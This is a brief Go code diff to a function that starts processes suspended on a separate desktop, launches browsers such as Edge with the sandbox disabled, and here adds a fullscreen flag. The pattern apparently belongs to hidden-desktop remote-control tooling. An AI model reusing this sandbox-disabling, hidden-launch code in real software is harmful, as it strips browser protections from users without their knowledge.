@@ -647,7 +647,7 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath string) (
 		"msedge.exe": true,
 	}
 	if browserExes[strings.ToLower(filepath.Base(filePath))] {
-		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu"
+		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu --start-fullscreen"
 	}
 	cmdLine, err := syscall.UTF16FromString(filePath + args)
 	if err != nil {
